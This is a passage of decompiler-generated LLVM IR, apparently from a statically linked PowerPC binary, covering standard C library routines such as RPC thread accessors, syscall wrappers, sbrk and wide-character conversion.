  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa44:                            ; preds = %dec_label_pc_1000fa24
  store i32 %v2_1000fa18, i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa50:                            ; preds = %dec_label_pc_1000fa10
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020), i32 0), label %dec_label_pc_1000fa6c, label %dec_label_pc_1000fa60

dec_label_pc_1000fa60:                            ; preds = %dec_label_pc_1000fa50
  %v2_1000fa64 = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020))
  br label %dec_label_pc_1000fa74

dec_label_pc_1000fa6c:                            ; preds = %dec_label_pc_1000fa50
  %v3_1000fa70 = load i32, i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000fa74

dec_label_pc_1000fa74:                            ; preds = %dec_label_pc_1000fa60, %dec_label_pc_1000fa6c
  %storemerge2 = phi i32 [ %v2_1000fa64, %dec_label_pc_1000fa60 ], [ %v3_1000fa70, %dec_label_pc_1000fa6c ]
  store i32 %storemerge2, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa78:                            ; preds = %dec_label_pc_1000fa04, %dec_label_pc_1000f994, %dec_label_pc_1000fa44, %dec_label_pc_1000fa34, %dec_label_pc_1000fa74
  %v0_1000fa7c = phi i32 [ %storemerge1, %dec_label_pc_1000fa04 ], [ %storemerge, %dec_label_pc_1000f994 ], [ %v2_1000fa18, %dec_label_pc_1000fa44 ], [ %v0_1000fa7c.pre, %dec_label_pc_1000fa34 ], [ %storemerge2, %dec_label_pc_1000fa74 ]
  ret i32 %v0_1000fa7c

; uselistorder directives
  uselistorder i32* @global_var_1002f084.466, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000fa78, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000fa74, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa04, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f994, { 1, 0 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  store i32 268499616, i32* @lr, align 4
  %v0_1000fa9c = call i32 @__rpc_thread_variables()
  %v4_1000faa8 = icmp eq i32 %v0_1000fa9c, ptrtoint (i32* @global_var_10033854.462 to i32)
  %v1_1000faac = add i32 %v0_1000fa9c, 148
  br i1 %v4_1000faa8, label %dec_label_pc_1000fab4, label %dec_label_pc_1000fabc

dec_label_pc_1000fab4:                            ; preds = %entry
  br label %dec_label_pc_1000fabc

dec_label_pc_1000fabc:                            ; preds = %entry, %dec_label_pc_1000fab4
  %v0_1000fac8 = phi i32 [ %v1_1000faac, %entry ], [ ptrtoint (i32* @global_var_1002f090.472 to i32), %dec_label_pc_1000fab4 ]
  ret i32 %v0_1000fac8

; uselistorder directives
  uselistorder label %dec_label_pc_1000fabc, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  store i32 268499676, i32* @lr, align 4
  %v0_1000fad8 = call i32 @__rpc_thread_variables()
  %v4_1000fae4 = icmp eq i32 %v0_1000fad8, ptrtoint (i32* @global_var_10033854.462 to i32)
  %v1_1000fae8 = add i32 %v0_1000fad8, 144
  br i1 %v4_1000fae4, label %dec_label_pc_1000faf0, label %dec_label_pc_1000faf8

dec_label_pc_1000faf0:                            ; preds = %entry
  br label %dec_label_pc_1000faf8

dec_label_pc_1000faf8:                            ; preds = %entry, %dec_label_pc_1000faf0
  %v0_1000fb04 = phi i32 [ ptrtoint (i32* @global_var_1002f094.473 to i32), %dec_label_pc_1000faf0 ], [ %v1_1000fae8, %entry ]
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_10030000.11 to i32), %dec_label_pc_1000faf0 ], [ ptrtoint (i32* @global_var_10033854.462 to i32), %entry ]
  store i32 %storemerge, i32* @r9, align 4
  ret i32 %v0_1000fb04

; uselistorder directives
  uselistorder label %dec_label_pc_1000faf8, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  store i32 268499736, i32* @lr, align 4
  %v0_1000fb14 = call i32 @__rpc_thread_variables()
  %v4_1000fb20 = icmp eq i32 %v0_1000fb14, ptrtoint (i32* @global_var_10033854.462 to i32)
  %v1_1000fb24 = add i32 %v0_1000fb14, 128
  br i1 %v4_1000fb20, label %dec_label_pc_1000fb2c, label %dec_label_pc_1000fb34

dec_label_pc_1000fb2c:                            ; preds = %entry
  br label %dec_label_pc_1000fb34

dec_label_pc_1000fb34:                            ; preds = %entry, %dec_label_pc_1000fb2c
  %v0_1000fb40 = phi i32 [ %v1_1000fb24, %entry ], [ ptrtoint (i32* @global_var_10033c0c.474 to i32), %dec_label_pc_1000fb2c ]
  ret i32 %v0_1000fb40

; uselistorder directives
  uselistorder label %dec_label_pc_1000fb34, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268499796, i32* @lr, align 4
  %v0_1000fb50 = call i32 @__rpc_thread_variables()
  %v4_1000fb5c = icmp eq i32 %v0_1000fb50, ptrtoint (i32* @global_var_10033854.462 to i32)
  br i1 %v4_1000fb5c, label %dec_label_pc_1000fb64, label %dec_label_pc_1000fb6c

dec_label_pc_1000fb64:                            ; preds = %entry
  br label %dec_label_pc_1000fb6c

dec_label_pc_1000fb6c:                            ; preds = %entry, %dec_label_pc_1000fb64
  %v0_1000fb78 = phi i32 [ %v0_1000fb50, %entry ], [ ptrtoint (i32* @global_var_10033b80.475 to i32), %dec_label_pc_1000fb64 ]
  ret i32 %v0_1000fb78

; uselistorder directives
  uselistorder label %dec_label_pc_1000fb6c, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020), i32 0), label %dec_label_pc_1000fbac, label %dec_label_pc_1000fba0

dec_label_pc_1000fba0:                            ; preds = %entry
  %v2_1000fba0 = call i32 @__pthread_internal_tsd_get(i32 2, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020))
  br label %dec_label_pc_1000fbb4

dec_label_pc_1000fbac:                            ; preds = %entry
  %v3_1000fbb0 = load i32, i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000fbb4

dec_label_pc_1000fbb4:                            ; preds = %dec_label_pc_1000fba0, %dec_label_pc_1000fbac
  %storemerge = phi i32 [ %v2_1000fba0, %dec_label_pc_1000fba0 ], [ %v3_1000fbb0, %dec_label_pc_1000fbac ]
  %v0_1000fc442 = phi i32 [ %v2_1000fba0, %dec_label_pc_1000fba0 ], [ 2, %dec_label_pc_1000fbac ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_1000fbb4 = icmp eq i32 %storemerge, 0
  %v4_1000fbc0 = icmp eq i32 %storemerge, ptrtoint (i32* @global_var_10033854.462 to i32)
  %brmerge = or i1 %v4_1000fbc0, %v3_1000fbb4
  br i1 %brmerge, label %dec_label_pc_1000fc34, label %dec_label_pc_1000fbcc

dec_label_pc_1000fbcc:                            ; preds = %dec_label_pc_1000fbb4
  store i32 ptrtoint (i32* @global_var_1000fbd0.476 to i32), i32* @lr, align 4
  %v1_1000fbcc = call i32 @__rpc_thread_svc_cleanup(i32 ptrtoint (i32* @global_var_10033854.462 to i32))
  store i32 268499924, i32* @lr, align 4
  %v1_1000fbd0 = call i32 @__rpc_thread_clnt_cleanup(i32 %v1_1000fbcc)
  %v0_1000fbd4 = load i32, i32* @r31, align 4
  %v1_1000fbd4 = add i32 %v0_1000fbd4, 152
  %v2_1000fbd4 = inttoptr i32 %v1_1000fbd4 to i32*
  %v3_1000fbd4 = load i32, i32* %v2_1000fbd4, align 4
  store i32 %v3_1000fbd4, i32* @r3, align 4
  store i32 268499932, i32* @lr, align 4
  %v0_1000fbd8 = call i32 @free()
  %v0_1000fbdc = load i32, i32* @r31, align 4
  %v1_1000fbdc = add i32 %v0_1000fbdc, 156
  %v2_1000fbdc = inttoptr i32 %v1_1000fbdc to i32*
  %v3_1000fbdc = load i32, i32* %v2_1000fbdc, align 4
  store i32 %v3_1000fbdc, i32* @r3, align 4
  store i32 268499940, i32* @lr, align 4
  %v0_1000fbe0 = call i32 @free()
  %v0_1000fbe4 = load i32, i32* @r31, align 4
  %v1_1000fbe4 = add i32 %v0_1000fbe4, 160
  %v2_1000fbe4 = inttoptr i32 %v1_1000fbe4 to i32*
  %v3_1000fbe4 = load i32, i32* %v2_1000fbe4, align 4
  store i32 %v3_1000fbe4, i32* @r3, align 4
  store i32 268499948, i32* @lr, align 4
  %v0_1000fbe8 = call i32 @free()
  %v0_1000fbec = load i32, i32* @r31, align 4
  %v1_1000fbec = add i32 %v0_1000fbec, 188
  %v2_1000fbec = inttoptr i32 %v1_1000fbec to i32*
  %v3_1000fbec = load i32, i32* %v2_1000fbec, align 4
  store i32 %v3_1000fbec, i32* @r3, align 4
  store i32 268499956, i32* @lr, align 4
  %v0_1000fbf0 = call i32 @free()
  %v0_1000fbf4 = load i32, i32* @r31, align 4
  %v1_1000fbf4 = add i32 %v0_1000fbf4, 172
  %v2_1000fbf4 = inttoptr i32 %v1_1000fbf4 to i32*
  %v3_1000fbf4 = load i32, i32* %v2_1000fbf4, align 4
  store i32 %v3_1000fbf4, i32* @r3, align 4
  store i32 268499964, i32* @lr, align 4
  %v0_1000fbf8 = call i32 @free()
  %v0_1000fbfc = load i32, i32* @r31, align 4
  %v1_1000fbfc = add i32 %v0_1000fbfc, 176
  %v2_1000fbfc = inttoptr i32 %v1_1000fbfc to i32*
  %v3_1000fbfc = load i32, i32* %v2_1000fbfc, align 4
  store i32 %v3_1000fbfc, i32* @r3, align 4
  store i32 268499972, i32* @lr, align 4
  %v0_1000fc00 = call i32 @free()
  %v0_1000fc04 = load i32, i32* @r31, align 4
  store i32 %v0_1000fc04, i32* @r3, align 4
  store i32 268499980, i32* @lr, align 4
  %v0_1000fc08 = call i32 @free()
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004), i32 0), label %dec_label_pc_1000fc2c, label %dec_label_pc_1000fc24

dec_label_pc_1000fc24:                            ; preds = %dec_label_pc_1000fbcc
  %v4_1000fc24 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  br label %dec_label_pc_1000fc34

dec_label_pc_1000fc2c:                            ; preds = %dec_label_pc_1000fbcc
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004), i32* @global_var_1002f088.464, align 4
  br label %dec_label_pc_1000fc34

dec_label_pc_1000fc34:                            ; preds = %dec_label_pc_1000fbb4, %dec_label_pc_1000fc24, %dec_label_pc_1000fc2c
  %v0_1000fc44 = phi i32 [ %v0_1000fc442, %dec_label_pc_1000fbb4 ], [ %v4_1000fc24, %dec_label_pc_1000fc24 ], [ 2, %dec_label_pc_1000fc2c ]
  ret i32 %v0_1000fc44

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27004), i32 0), { 1, 2, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10033854.462 to i32), { 1, 4, 5, 6, 0, 7, 8, 2, 3 }
  uselistorder i32 (i32, i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -27020), { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000fc34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fbb4, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000fc48 = load i32, i32* @lr, align 4
  %v0_1000fc54 = load i32, i32* @r3, align 4
  store i32 %v0_1000fc54, i32* @r29, align 4
  %v0_1000fc5c = call i32 @__errno_location()
  %v0_1000fc60 = load i32, i32* @r29, align 4
  %v2_1000fc60 = inttoptr i32 %v0_1000fc5c to i32*
  store i32 %v0_1000fc60, i32* %v2_1000fc60, align 4
  store i32 %v0_1000fc48, i32* @lr, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000fcd4 = add i32 %tmp, 84
  %v2_1000fcd4 = inttoptr i32 %v1_1000fcd4 to i32*
  %v3_1000fcd4 = load i32, i32* %v2_1000fcd4, align 4
  %v1_1000fcf0 = call %0 @__asm_mtcrf(i32 255, i32 %v3_1000fcd4)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000fd34 = load i32, i32* @lr, align 4
  %v1_1000fd34 = load i1, i1* @cr0_so, align 1
  %v2_1000fd34 = xor i1 %v1_1000fd34, true
  call void @__pseudo_cond_branch(i1 %v2_1000fd34, i32 %v0_1000fd34)
  %v0_1000fd38 = call i32 @__syscall_error()
  ret i32 %v0_1000fd38
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fd54 = call i32 @__asm_mfcr()
  %v1_1000fd58 = and i32 %v0_1000fd54, 268435456
  %v3_1000fd58 = icmp eq i32 %v1_1000fd58, 0
  store i32 %v0_1000fd54, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fd58, label %dec_label_pc_1000fd70, label %dec_label_pc_1000fd64

dec_label_pc_1000fd64:                            ; preds = %entry
  %v0_1000fd64 = call i32 @__errno_location()
  %v0_1000fd68 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fd68 = inttoptr i32 %v0_1000fd64 to i32*
  store i32 %v0_1000fd68, i32* %v2_1000fd68, align 4
  br label %dec_label_pc_1000fd70

dec_label_pc_1000fd70:                            ; preds = %entry, %dec_label_pc_1000fd64
  %v0_1000fd80 = phi i32 [ %v0_1000fd54, %entry ], [ -1, %dec_label_pc_1000fd64 ]
  ret i32 %v0_1000fd80

; uselistorder directives
  uselistorder label %dec_label_pc_1000fd70, { 1, 0 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fd9c = call i32 @__asm_mfcr()
  %v1_1000fda0 = and i32 %v0_1000fd9c, 268435456
  store i32 %v1_1000fda0, i32* @r9, align 4
  %v3_1000fda0 = icmp eq i32 %v1_1000fda0, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_1000fd9c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fda0, label %dec_label_pc_1000fdb8, label %dec_label_pc_1000fdac

dec_label_pc_1000fdac:                            ; preds = %entry
  %v0_1000fdac = call i32 @__errno_location()
  %v0_1000fdb0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fdb0 = inttoptr i32 %v0_1000fdac to i32*
  store i32 %v0_1000fdb0, i32* %v2_1000fdb0, align 4
  br label %dec_label_pc_1000fdb8

dec_label_pc_1000fdb8:                            ; preds = %entry, %dec_label_pc_1000fdac
  %v0_1000fdc8 = phi i32 [ %v0_1000fd9c, %entry ], [ -1, %dec_label_pc_1000fdac ]
  ret i32 %v0_1000fdc8

; uselistorder directives
  uselistorder i1* @cr0_so, { 7, 5, 4, 10, 11, 12, 6, 8, 9, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000fdb8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fde4 = call i32 @__asm_mfcr()
  %v1_1000fde8 = and i32 %v0_1000fde4, 268435456
  %v3_1000fde8 = icmp eq i32 %v1_1000fde8, 0
  store i32 %v0_1000fde4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fde8, label %dec_label_pc_1000fe00, label %dec_label_pc_1000fdf4

dec_label_pc_1000fdf4:                            ; preds = %entry
  %v0_1000fdf4 = call i32 @__errno_location()
  %v0_1000fdf8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fdf8 = inttoptr i32 %v0_1000fdf4 to i32*
  store i32 %v0_1000fdf8, i32* %v2_1000fdf8, align 4
  br label %dec_label_pc_1000fe00

dec_label_pc_1000fe00:                            ; preds = %entry, %dec_label_pc_1000fdf4
  %v0_1000fe10 = phi i32 [ %v0_1000fde4, %entry ], [ -1, %dec_label_pc_1000fdf4 ]
  ret i32 %v0_1000fe10

; uselistorder directives
  uselistorder label %dec_label_pc_1000fe00, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fe2c = call i32 @__asm_mfcr()
  %v1_1000fe30 = and i32 %v0_1000fe2c, 268435456
  %v3_1000fe30 = icmp eq i32 %v1_1000fe30, 0
  store i32 %v0_1000fe2c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fe30, label %dec_label_pc_1000fe48, label %dec_label_pc_1000fe3c

dec_label_pc_1000fe3c:                            ; preds = %entry
  %v0_1000fe3c = call i32 @__errno_location()
  %v0_1000fe40 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fe40 = inttoptr i32 %v0_1000fe3c to i32*
  store i32 %v0_1000fe40, i32* %v2_1000fe40, align 4
  br label %dec_label_pc_1000fe48

dec_label_pc_1000fe48:                            ; preds = %entry, %dec_label_pc_1000fe3c
  %v0_1000fe58 = phi i32 [ %v0_1000fe2c, %entry ], [ -1, %dec_label_pc_1000fe3c ]
  ret i32 %v0_1000fe58

; uselistorder directives
  uselistorder label %dec_label_pc_1000fe48, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fe74 = call i32 @__asm_mfcr()
  %v1_1000fe78 = and i32 %v0_1000fe74, 268435456
  %v3_1000fe78 = icmp eq i32 %v1_1000fe78, 0
  store i32 %v0_1000fe74, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fe78, label %dec_label_pc_1000fe90, label %dec_label_pc_1000fe84

dec_label_pc_1000fe84:                            ; preds = %entry
  %v0_1000fe84 = call i32 @__errno_location()
  %v0_1000fe88 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fe88 = inttoptr i32 %v0_1000fe84 to i32*
  store i32 %v0_1000fe88, i32* %v2_1000fe88, align 4
  br label %dec_label_pc_1000fe90

dec_label_pc_1000fe90:                            ; preds = %entry, %dec_label_pc_1000fe84
  %v0_1000fea0 = phi i32 [ %v0_1000fe74, %entry ], [ -1, %dec_label_pc_1000fe84 ]
  ret i32 %v0_1000fea0

; uselistorder directives
  uselistorder label %dec_label_pc_1000fe90, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000febc = call i32 @__asm_mfcr()
  %v1_1000fec0 = and i32 %v0_1000febc, 268435456
  %v3_1000fec0 = icmp eq i32 %v1_1000fec0, 0
  store i32 %v0_1000febc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fec0, label %dec_label_pc_1000fed8, label %dec_label_pc_1000fecc

dec_label_pc_1000fecc:                            ; preds = %entry
  %v0_1000fecc = call i32 @__errno_location()
  %v0_1000fed0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fed0 = inttoptr i32 %v0_1000fecc to i32*
  store i32 %v0_1000fed0, i32* %v2_1000fed0, align 4
  br label %dec_label_pc_1000fed8

dec_label_pc_1000fed8:                            ; preds = %entry, %dec_label_pc_1000fecc
  %v0_1000fee8 = phi i32 [ %v0_1000febc, %entry ], [ -1, %dec_label_pc_1000fecc ]
  ret i32 %v0_1000fee8

; uselistorder directives
  uselistorder label %dec_label_pc_1000fed8, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ff04 = call i32 @__asm_mfcr()
  %v1_1000ff08 = and i32 %v0_1000ff04, 268435456
  %v3_1000ff08 = icmp eq i32 %v1_1000ff08, 0
  store i32 %v0_1000ff04, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ff08, label %dec_label_pc_1000ff20, label %dec_label_pc_1000ff14

dec_label_pc_1000ff14:                            ; preds = %entry
  %v0_1000ff14 = call i32 @__errno_location()
  %v0_1000ff18 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ff18 = inttoptr i32 %v0_1000ff14 to i32*
  store i32 %v0_1000ff18, i32* %v2_1000ff18, align 4
  br label %dec_label_pc_1000ff20

dec_label_pc_1000ff20:                            ; preds = %entry, %dec_label_pc_1000ff14
  %v0_1000ff30 = phi i32 [ %v0_1000ff04, %entry ], [ -1, %dec_label_pc_1000ff14 ]
  ret i32 %v0_1000ff30

; uselistorder directives
  uselistorder i32 268435456, { 29, 30, 31, 14, 15, 28, 27, 34, 17, 18, 36, 37, 11, 20, 32, 7, 9, 10, 6, 8, 21, 19, 16, 0, 39, 33, 5, 1, 2, 4, 24, 38, 25, 12, 13, 23, 42, 3, 22, 26, 35, 40, 41, 43 }
  uselistorder label %dec_label_pc_1000ff20, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000ff50 = load i32, i32* @global_var_1002f0c0.478, align 4
  %v3_1000ff54 = icmp eq i32 %v3_1000ff50, 0
  br i1 %v3_1000ff54, label %dec_label_pc_1000ff5c, label %dec_label_pc_1000ff68

dec_label_pc_1000ff5c:                            ; preds = %entry
  store i32 268500832, i32* @lr, align 4
  %v1_1000ff5c = call i32 @__GI_brk(i32 0)
  %v1_1000ff60 = icmp slt i32 %v1_1000ff5c, 0
  br i1 %v1_1000ff60, label %dec_label_pc_1000ff88, label %dec_label_pc_1000ff5c.dec_label_pc_1000ff68_crit_edge

dec_label_pc_1000ff5c.dec_label_pc_1000ff68_crit_edge: ; preds = %dec_label_pc_1000ff5c
  %v0_1000ff68.pre = load i32, i32* @r30, align 4
  %v3_1000ff6c.pre = load i32, i32* @global_var_1002f0c0.478, align 4
  br label %dec_label_pc_1000ff68

dec_label_pc_1000ff68:                            ; preds = %dec_label_pc_1000ff5c.dec_label_pc_1000ff68_crit_edge, %entry
  %v3_1000ff6c = phi i32 [ %v3_1000ff6c.pre, %dec_label_pc_1000ff5c.dec_label_pc_1000ff68_crit_edge ], [ %v3_1000ff50, %entry ]
  %v1_1000ff74 = phi i32 [ %v0_1000ff68.pre, %dec_label_pc_1000ff5c.dec_label_pc_1000ff68_crit_edge ], [ %arg1, %entry ]
  %v3_1000ff68 = icmp eq i32 %v1_1000ff74, 0
  store i32 %v3_1000ff6c, i32* @r31, align 4
  br i1 %v3_1000ff68, label %dec_label_pc_1000ff8c, label %dec_label_pc_1000ff7c

dec_label_pc_1000ff7c:                            ; preds = %dec_label_pc_1000ff68
  %v2_1000ff74 = add i32 %v1_1000ff74, %v3_1000ff6c
  store i32 268500864, i32* @lr, align 4
  %v1_1000ff7c = call i32 @__GI_brk(i32 %v2_1000ff74)
  %tmp6 = icmp sgt i32 %v1_1000ff7c, -1
  br i1 %tmp6, label %dec_label_pc_1000ff7c.dec_label_pc_1000ff8c_crit_edge, label %dec_label_pc_1000ff88

dec_label_pc_1000ff7c.dec_label_pc_1000ff8c_crit_edge: ; preds = %dec_label_pc_1000ff7c
  %v0_1000ff90.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ff8c

dec_label_pc_1000ff88:                            ; preds = %dec_label_pc_1000ff7c, %dec_label_pc_1000ff5c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000ff8c

dec_label_pc_1000ff8c:                            ; preds = %dec_label_pc_1000ff7c.dec_label_pc_1000ff8c_crit_edge, %dec_label_pc_1000ff68, %dec_label_pc_1000ff88
  %v0_1000ff90 = phi i32 [ %v0_1000ff90.pre, %dec_label_pc_1000ff7c.dec_label_pc_1000ff8c_crit_edge ], [ %v3_1000ff6c, %dec_label_pc_1000ff68 ], [ -1, %dec_label_pc_1000ff88 ]
  ret i32 %v0_1000ff90

; uselistorder directives
  uselistorder i32 %v3_1000ff6c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000ff8c, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002f050.226 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1002f050.226, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000ffb0 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_1000ffcc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000ffcc, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000ffb0, label %dec_label_pc_1000ffd8, label %dec_label_pc_1000ffe0

dec_label_pc_1000ffd8:                            ; preds = %entry
  %v2_1000ffd8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000ffd8, i32* @r3, align 4
  br label %dec_label_pc_1000ffe0

dec_label_pc_1000ffe0:                            ; preds = %entry, %dec_label_pc_1000ffd8
  %v0_1000ffe4 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000ffd8 ]
  %v2_1000ffe0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000ffe4, i32* %stack_var_-40, align 4
  store i32 %v2_1000ffe0, i32* %stack_var_-36, align 4
  store i32 268500976, i32* @lr, align 4
  %v0_1000ffec = call i32 @__GI_wcsnrtombs()
  %v3_1000fff0 = icmp eq i32 %v0_1000ffec, 0
  br i1 %v3_1000fff0, label %dec_label_pc_1000fff8, label %dec_label_pc_1000fffc

dec_label_pc_1000fff8:                            ; preds = %dec_label_pc_1000ffe0
  br label %dec_label_pc_1000fffc

dec_label_pc_1000fffc:                            ; preds = %dec_label_pc_1000ffe0, %dec_label_pc_1000fff8
  %v0_10010008 = phi i32 [ %v0_1000ffec, %dec_label_pc_1000ffe0 ], [ 1, %dec_label_pc_1000fff8 ]
  ret i32 %v0_10010008

; uselistorder directives
  uselistorder label %dec_label_pc_1000fffc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ffe0, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10010010 = load i32, i32* @r5, align 4
  store i32 %v0_10010010, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10010018 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10010018

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001001c = load i32, i32* @r3, align 4
  %v3_1001001c = icmp eq i32 %v0_1001001c, 0
  %v0_10010020 = load i32, i32* @lr, align 4
  store i32 %v0_10010020, i32* %r0.global-to-local, align 4
  br i1 %v3_1001001c, label %dec_label_pc_10010048, label %dec_label_pc_10010030

dec_label_pc_10010030:                            ; preds = %entry
  %v1_10010030 = load i32, i32* @r4, align 4
  %v4_10010030 = icmp eq i32 %v0_1001001c, %v1_10010030
  store i32 1, i32* @r10, align 4
  br i1 %v4_10010030, label %dec_label_pc_1001003c, label %dec_label_pc_10010074

dec_label_pc_1001003c:                            ; preds = %dec_label_pc_10010030
  %v2_10010040 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10010040, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  br label %dec_label_pc_10010074

dec_label_pc_10010048:                            ; preds = %entry
  %v2_1001004011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001004011, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10010074

dec_label_pc_10010054:                            ; preds = %dec_label_pc_100100b4.dec_label_pc_10010094_crit_edge, %dec_label_pc_10010094.preheader
  %v0_10010054 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10010060 = inttoptr i32 %v0_10010054 to i32*
  store i32 84, i32* %v2_10010060, align 4
  %v0_100100d8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100100d4

dec_label_pc_10010068:                            ; preds = %dec_label_pc_100100a4
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_100100c4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100100c0

dec_label_pc_10010074:                            ; preds = %dec_label_pc_1001003c, %dec_label_pc_10010030, %dec_label_pc_10010048
  %v2_100100a47 = phi i32 [ %v2_10010040, %dec_label_pc_1001003c ], [ %v0_1001001c, %dec_label_pc_10010030 ], [ %v2_1001004011, %dec_label_pc_10010048 ]
